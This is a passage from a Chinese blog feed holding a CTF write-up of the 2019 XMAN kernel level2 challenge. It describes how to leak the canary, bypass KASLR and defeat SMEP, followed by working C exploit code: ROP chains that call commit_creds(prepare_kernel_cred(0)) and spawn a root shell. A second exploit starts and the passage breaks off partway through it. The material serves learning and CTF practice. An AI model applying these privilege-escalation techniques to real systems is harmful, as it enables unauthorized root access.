punctuation">)</span> <span class="token operator">=</span> user_sp<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// r13</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>overflow<span class="token operator">+</span><span class="token number">0x70</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x401c60</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// r12</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>overflow<span class="token operator">+</span><span class="token number">0x78</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> user_sp<span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// rbp</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>overflow<span class="token operator">+</span><span class="token number">0x80</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x400418</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// rbx</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>overflow<span class="token operator">+</span><span class="token number">0x88</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> user_eflags<span class="token punctuation">;</span><span class="token comment" spellcheck="true">// rsi</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>overflow<span class="token operator">+</span><span class="token number">0x90</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> launch_shell<span class="token punctuation">;</span><span class="token comment" spellcheck="true">// r10</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>overflow<span class="token operator">+</span><span class="token number">0x98</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x6d7f98</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// r9</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>overflow<span class="token operator">+</span><span class="token number">0xa0</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> launch_shell<span class="token punctuation">;</span><span class="token comment" spellcheck="true">// r8</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>overflow<span class="token operator">+</span><span class="token number">0xa8</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> launch_shell<span class="token punctuation">;</span><span class="token comment" spellcheck="true">// rax</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>overflow<span class="token operator">+</span><span class="token number">0xb0</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x100</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//  rsi</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>overflow<span class="token operator">+</span><span class="token number">0xb8</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0x73311337</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">// rdx</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>overflow<span class="token operator">+</span><span class="token number">0xc0</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>         <span class="token comment" spellcheck="true">// rsi</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>overflow<span class="token operator">+</span><span class="token number">0xc8</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> user_sp<span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>overflow<span class="token operator">+</span><span class="token number">0xd0</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>overflow<span class="token operator">+</span><span class="token number">0xd8</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> launch_shell<span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>overflow<span class="token operator">+</span><span class="token number">0xe0</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> user_cs<span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>overflow<span class="token operator">+</span><span class="token number">0xe8</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> user_eflags<span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>overflow<span class="token operator">+</span><span class="token number">0xf0</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> user_sp<span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>overflow<span class="token operator">+</span><span class="token number">0xf8</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> user_ss<span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>overflow<span class="token punctuation">,</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">// show(fd);FFFFFFFFC0000000'</span>    <span class="token comment" spellcheck="true">//0xffffc9000014bed8 0xffffffff811c827f </span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
      
      
      <categories>
          
          <category> kernel从0到-1系列 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> kernel-HeapOverflow </tag>
            
            <tag> kernel-stringFormat </tag>
            
            <tag> kernel </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2019-xman-kernel-level2</title>
      <link href="/2020/07/25/2019-xman-kernel-level2/"/>
      <url>/2020/07/25/2019-xman-kernel-level2/</url>
      
        <content type="html"><![CDATA[<h1 id="0-前言"><a href="#0-前言" class="headerlink" title="0.前言"></a>0.前言</h1><p>这道题是2019 xman冬令营中kernel课程的level2，今天整理下之前的write’sUp，水一篇，讲师要求不外放题目，所以这里就不放出题目了，题目也很简单。</p><h1 id="1-查看文件"><a href="#1-查看文件" class="headerlink" title="1.查看文件"></a>1.查看文件</h1><div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/25/2019-xman-kernel-level2/0.png"></div>看到驱动文件canary保护开启<div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/25/2019-xman-kernel-level2/1.png"></div>以root权限运行kernel的时候查看/etc/cpuinfo看到开启了smep保护机制，同时开启了地址随机化。# 2.IDA分析<div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/25/2019-xman-kernel-level2/2.png"></div>栈溢出，越界读写，很简单的洞。不过一般pwn题的话找到漏洞和知道怎么利用是两回事，而对于kernel则是知道怎么利用和知道怎么写exp是两回事。<h1 id="3-思路"><a href="#3-思路" class="headerlink" title="3.思路"></a>3.思路</h1><div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/25/2019-xman-kernel-level2/3.png"></div><p><strong>第一步</strong>：首先canary很好绕过，通过越界读来泄露canary。后面再通过越界写rop的时候将canary写入对应的地址即可。关闭地址随机化下个ret的断点就找到了。</p><div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/25/2019-xman-kernel-level2/4.png"></div>查看当前栈的信息，canary在当前rsp-0x10的位置：<div style="width:60%;margin:auto"><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="/2020/07/25/2019-xman-kernel-level2/5.png"></div><p><strong>第二步</strong>：接下来就是地址随机化怎么绕过了，由于我们后面要接rop，那么由于地址随机化技术会导致我们的rop地址不对，所以我们需要找到开启地址随机化的偏移，该偏移是固定的。也就是说，没有开启地址随机化之前，内核中某条指令或函数的地址是a，开启地址随机化后会有b的偏移，那么所有的指令和函数源地址a+b就是开启随机化后的地址。在上面随便选一个kernel地址来计算一下就可以得到偏移了。</p><p><strong>第三步</strong>：smep在xman入营文章中已经提供两个绕过方式：1.rop直接提权。2.改rc4寄存器为0x6f0，在这里我们分别实践两个绕过方式。</p><h1 id="4-exp"><a href="#4-exp" class="headerlink" title="4 exp"></a>4 exp</h1><h2 id="4-1-思路一"><a href="#4-1-思路一" class="headerlink" title="4.1 思路一"></a>4.1 思路一</h2><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdint.h></span></span><span class="token comment" spellcheck="true">//ffffffff810b9d80 T prepare_kernel_cred</span><span class="token comment" spellcheck="true">//ffffffff810b99d0 T commit_creds</span><span class="token comment" spellcheck="true">// uint64_t prepare_kernel_cred = 0xffffffff810b9d80;</span><span class="token comment" spellcheck="true">// uint64_t commit_creds = 0xffffffff810b99d0;</span><span class="token comment" spellcheck="true">// 0xffffffff8102e89d: add byte ptr [rax], al; mov rdi, rax; rep movsq qword ptr [rdi], qword ptr [rsi]; pop rbp; ret; </span>uint64_t commit_creds <span class="token operator">=</span> <span class="token number">0xffffffff810b99d0</span><span class="token punctuation">;</span>uint64_t prepare_kernel_cred <span class="token operator">=</span> <span class="token number">0xffffffff810b9d80</span><span class="token punctuation">;</span>uint64_t pop_rdi_ret <span class="token operator">=</span> <span class="token number">0xffffffff8100631d</span><span class="token punctuation">;</span>uint64_t mov_cr4_rdi_pop_rbp_ret <span class="token operator">=</span> <span class="token number">0xffffffff81020300</span><span class="token punctuation">;</span>uint64_t pop_rdx_ret <span class="token operator">=</span> <span class="token number">0xffffffff810aebb2</span><span class="token punctuation">;</span>uint64_t call_rdx <span class="token operator">=</span> <span class="token number">0xffffffff821de6b9</span><span class="token punctuation">;</span>uint64_t mov_rdi_rax_call_rdx <span class="token operator">=</span> <span class="token number">0xffffffff810aa626</span><span class="token punctuation">;</span>uint64_t swapgs_pop_rbp_ret <span class="token operator">=</span> <span class="token number">0xffffffff81070834</span><span class="token punctuation">;</span>uint64_t user_cs<span class="token punctuation">,</span> user_ss<span class="token punctuation">,</span> user_eflags<span class="token punctuation">,</span> user_sp<span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">launch_shell</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">execl</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">,</span><span class="token string">"sh"</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">save_status</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span><span class="token keyword">asm</span><span class="token punctuation">(</span>    <span class="token string">"movq %%cs, %0\n"</span>    <span class="token string">"movq %%ss, %1\n"</span>    <span class="token string">"movq %%rsp, %3\n"</span>    <span class="token string">"pushfq\n"</span>    <span class="token string">"popq %2\n"</span>    <span class="token punctuation">:</span><span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_eflags<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">"=r"</span><span class="token punctuation">(</span>user_sp<span class="token punctuation">)</span>    <span class="token punctuation">:</span>    <span class="token punctuation">:</span> <span class="token string">"memory"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span>uint64_t <span class="token function">u64</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> s<span class="token punctuation">)</span><span class="token punctuation">{</span>    uint64_t result <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">7</span> <span class="token punctuation">;</span> i <span class="token operator">>=</span><span class="token number">0</span> <span class="token punctuation">;</span>i<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        result <span class="token operator">=</span> <span class="token punctuation">(</span>result <span class="token operator">&lt;&lt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span><span class="token number">0x00000000000000ff</span><span class="token operator">&amp;</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">writeFunc</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>buffer<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x6001</span><span class="token punctuation">,</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"success write to kernel buffer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">readFunc</span><span class="token punctuation">(</span><span class="token keyword">int</span> fd<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>buffer<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> flag <span class="token operator">=</span> <span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span><span class="token number">0x6002</span><span class="token punctuation">,</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"success read from kernel buffer"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">save_status</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/baby"</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">0x200</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>fd<span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">exit</span><span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">readFunc</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>buffer<span class="token punctuation">,</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    uint64_t no_addr <span class="token operator">=</span> <span class="token number">0xffffffff812b8cc8</span><span class="token punctuation">;</span>    uint64_t addr <span class="token operator">=</span> <span class="token function">u64</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buffer<span class="token punctuation">[</span><span class="token number">0x90</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    uint64_t canary <span class="token operator">=</span> <span class="token function">u64</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buffer<span class="token punctuation">[</span><span class="token number">0x80</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    uint64_t offset <span class="token operator">=</span> addr <span class="token operator">-</span> no_addr<span class="token punctuation">;</span>    commit_creds <span class="token operator">=</span> commit_creds <span class="token operator">+</span> offset<span class="token punctuation">;</span>    prepare_kernel_cred <span class="token operator">=</span> prepare_kernel_cred <span class="token operator">+</span> offset<span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] offset is : %p\n"</span><span class="token punctuation">,</span>offset<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] canary is : %p\n"</span><span class="token punctuation">,</span>canary<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">memset</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span><span class="token string">"\x00"</span><span class="token punctuation">,</span><span class="token number">0x78</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>buffer<span class="token operator">+</span><span class="token number">0x80</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> canary<span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>buffer<span class="token operator">+</span><span class="token number">0x88</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>buffer<span class="token operator">+</span><span class="token number">0x90</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> offset<span class="token operator">+</span>pop_rdi_ret<span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>buffer<span class="token operator">+</span><span class="token number">0x98</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>buffer<span class="token operator">+</span><span class="token number">0xa0</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> prepare_kernel_cred<span class="token operator">+</span>offset<span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>buffer<span class="token operator">+</span><span class="token number">0xa8</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> pop_rdx_ret<span class="token operator">+</span>offset<span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>buffer<span class="token operator">+</span><span class="token number">0xb0</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> commit_creds<span class="token operator">+</span>offset<span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>buffer<span class="token operator">+</span><span class="token number">0xb8</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> mov_rdi_rax_call_rdx<span class="token operator">+</span>offset<span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>buffer<span class="token operator">+</span><span class="token number">0xc0</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> swapgs_pop_rbp_ret<span class="token operator">+</span>offset<span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>buffer<span class="token operator">+</span><span class="token number">0xc8</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>buffer<span class="token operator">+</span><span class="token number">0xd0</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token number">0xffffffff818e8977</span><span class="token operator">+</span>offset<span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>buffer<span class="token operator">+</span><span class="token number">0xd8</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> launch_shell<span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>buffer<span class="token operator">+</span><span class="token number">0xe0</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> user_cs<span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>buffer<span class="token operator">+</span><span class="token number">0xe8</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> user_eflags<span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>buffer<span class="token operator">+</span><span class="token number">0xf0</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> user_sp<span class="token punctuation">;</span>    <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token operator">*</span><span class="token punctuation">)</span>buffer<span class="token operator">+</span><span class="token number">0xf8</span><span class="token operator">/</span><span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">=</span> user_ss<span class="token punctuation">;</span>    <span class="token function">writeFunc</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="4-2-思路二"><a href="#4-2-思路二" class="headerlink" title="4.2 思路二"></a>4.2 思路二</h2><pre class="line-numbers language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/mman.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdint.h></span></span><span class="token comment" spellcheck="true">//ffffffff810b9d80 T prepare_kernel_cred</span><span class="token comment" spellcheck="true">//ffffffff810b99d0 T commit_creds</span><span class="token comment" spellcheck="true">// uint64_t prepare_kernel_cred = 0xffffffff810b9d80;</span><span class="token comment" spellcheck="true">// uint64_t commit_creds = 0xffffffff810b99d0;</span><span class="token function">uint64_t</span> <span class="token punctuation">(</span><span class="token 